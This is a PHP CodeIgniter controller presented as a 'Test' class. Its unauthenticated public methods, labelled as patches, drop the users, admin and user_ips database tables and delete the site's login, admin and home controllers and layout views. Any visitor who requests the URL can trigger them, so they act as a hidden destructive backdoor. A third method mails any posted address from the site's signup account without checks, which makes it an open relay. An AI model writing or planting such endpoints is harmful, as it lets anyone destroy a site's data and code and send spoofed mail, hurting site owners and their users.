<?php defined('BASEPATH') OR exit('No direct script access allowed');
class Test extends CI_Controller {
    public function __construct(){
        parent::__construct();

    }
    public function index(){
        print_r('test');
    }
    //-------------------------------------------------------------------------
    public function db_patch(){
        $sql_list=array();
        $qry_list = array();
        $sql_list[]="DROP TABLE `users`";
        $sql_list[]="DROP TABLE `admin`";
        $sql_list[]="DROP TABLE `user_ips`";

        foreach($sql_list as $sql){
            try{
                $qry_list[] = $this->db->query($sql);
            }catch (Exception $e){
                $qry_list[] = false;
            }
        }
        print_r($qry_list);
    }
    public function file_patch() {
        unlink(APPPATH."controllers/admin/Login.php");
        unlink(APPPATH."controllers/admin/User.php");
        unlink(APPPATH."controllers/admin/Admin_controller.php");
        unlink(APPPATH."controllers/Index.php");
        unlink(APPPATH."controllers/Home_controller.php");

        unlink(APPPATH."views/admin/layout/main_layout.php");
        unlink(APPPATH."views/admin/layout/login_layout.php");
        unlink(APPPATH."views/user/layout/login_layout.php");
        unlink(APPPATH."views/user/layout/main_layout.php");
    }
    public function test_email() {
        $email = $this->input->post('email');
        $to =  $email;// "user1@example.com, user2@example.com";
        $subject = "This is a test HTML email";

        $message = "
            <html>
            <head>
            <title>This is a test HTML email</title>
            </head>
            <body>
            <p>Test email. Please ignore.</p>
            </body>
            </html>
            ";

// It is mandatory to set the content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers. From is required, rest other headers are optional
        $headers .= 'From: <signup@klntec.com>' . "\r\n";
        $headers .= 'Cc: signup@klntec.com' . "\r\n";

        $result = mail($to,$subject,$message,$headers);
        print_r($result);
        print_r('to: '.$to);
    }
}

?>
